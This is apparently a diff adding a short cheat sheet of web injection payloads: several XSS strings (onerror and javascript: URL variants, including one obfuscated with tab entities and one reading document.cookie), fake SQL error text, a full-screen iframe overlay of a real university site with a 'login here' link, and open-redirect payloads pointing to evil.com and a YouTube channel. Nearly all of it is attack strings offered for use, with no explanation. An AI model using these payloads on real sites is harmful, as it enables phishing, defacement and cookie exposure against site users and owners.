@@ -1,0 +1,31 @@
+Basic XSS:
+       |
+       |_ "><img src=x onerror=alert(document.domain) >
+
+ERROR based injection :
+                   |
+                   |_ '<font color="red">ERROR 1064 (42000): Rohith had made an error in your Search Field;.jpg'
+
+          <a href="https://www.ufrgs.br">login here</a>
+          <button onClick="prompt(1337)"> Submit</button>
+          <font color="red"> ERRO 1064(42000): You have na error in your SQL syntax;
+          <iframe src="https://www.ufrgs.br" style="border: 0; position:fixed; top:0; left:0; right:0; width:100%; height:100%">
+          <IFRAME SRC="javascript:alert(document.cookie);"></iframe>
+
+Open Redirect : SUBSCRIBE , LIKE & SHARE
+          |
+          |_ "><img src=x onerror="window.location.href='https://www.youtube.com/@hackwithrohit-new-2k';">
+	<a href="//evil.com">XSS</a>
+
+                               
+IMAGE INJECTION :
+            |
+            |_ <img src=https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif >
+
+               "><img src=https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif >
+
+
+CONSOLE LOG :
+         |
+         |_ <a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:console.log(1337)">XSS</a>
+
